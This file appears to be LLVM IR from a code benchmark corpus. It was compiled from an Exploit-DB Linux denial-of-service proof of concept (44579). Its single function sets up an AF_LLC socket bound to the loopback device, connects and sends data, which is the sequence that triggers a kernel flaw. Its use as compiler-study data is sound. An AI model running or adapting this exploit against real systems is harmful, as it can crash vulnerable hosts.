; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_44579.c_test.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_44579.c_test.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_llc = type { i32, i32 }
%struct.sockaddr = type { i32 }

@AF_LLC = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@__const.test.output = private unnamed_addr constant [32 x i8] c"lo\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_BINDTODEVICE = common dso_local global i32 0, align 4
@__const.test.msg = private unnamed_addr constant [16 x i8] c"aaaa\00\00\00\00\00\00\00\00\00\00\00\00", align 16

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [32 x i8], align 16
  %3 = alloca i32, align 4
  %4 = alloca %struct.sockaddr_llc, align 4
  %5 = alloca %struct.sockaddr_llc, align 4
  %6 = alloca [16 x i8], align 16
  %7 = load i32, i32* @AF_LLC, align 4
  %8 = load i32, i32* @SOCK_STREAM, align 4
  %9 = call i32 @socket(i32 %7, i32 %8, i32 0)
  store i32 %9, i32* %1, align 4
  %10 = bitcast [32 x i8]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([32 x i8], [32 x i8]* @__const.test.output, i32 0, i32 0), i64 32, i1 false)
  %11 = load i32, i32* %1, align 4
  %12 = load i32, i32* @SOL_SOCKET, align 4
  %13 = load i32, i32* @SO_BINDTODEVICE, align 4
  %14 = bitcast [32 x i8]* %2 to i8**
  %15 = call i32 @setsockopt(i32 %11, i32 %12, i32 %13, i8** %14, i32 16)
  %16 = getelementptr inbounds %struct.sockaddr_llc, %struct.sockaddr_llc* %4, i32 0, i32 0
  store i32 2, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_llc, %struct.sockaddr_llc* %4, i32 0, i32 1
  %18 = load i32, i32* @AF_LLC, align 4
  store i32 %18, i32* %17, align 4
  %19 = load i32, i32* %1, align 4
  %20 = bitcast %struct.sockaddr_llc* %4 to %struct.sockaddr*
  %21 = call i32 @bind(i32 %19, %struct.sockaddr* %20, i32 8)
  %22 = getelementptr inbounds %struct.sockaddr_llc, %struct.sockaddr_llc* %5, i32 0, i32 0
  store i32 2, i32* %22, align 4
  %23 = getelementptr inbounds %struct.sockaddr_llc, %struct.sockaddr_llc* %5, i32 0, i32 1
  %24 = load i32, i32* @AF_LLC, align 4
  store i32 %24, i32* %23, align 4
  %25 = load i32, i32* %1, align 4
  %26 = bitcast %struct.sockaddr_llc* %5 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 8)
  %28 = bitcast [16 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %28, i8* align 16 getelementptr inbounds ([16 x i8], [16 x i8]* @__const.test.msg, i32 0, i32 0), i64 16, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i64 0, i64 0
  %31 = call i32 @send(i32 %29, i8* %30, i32 16, i32 0)
  ret void
}

declare dso_local i32 @socket(i32, i32, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @setsockopt(i32, i32, i32, i8**, i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
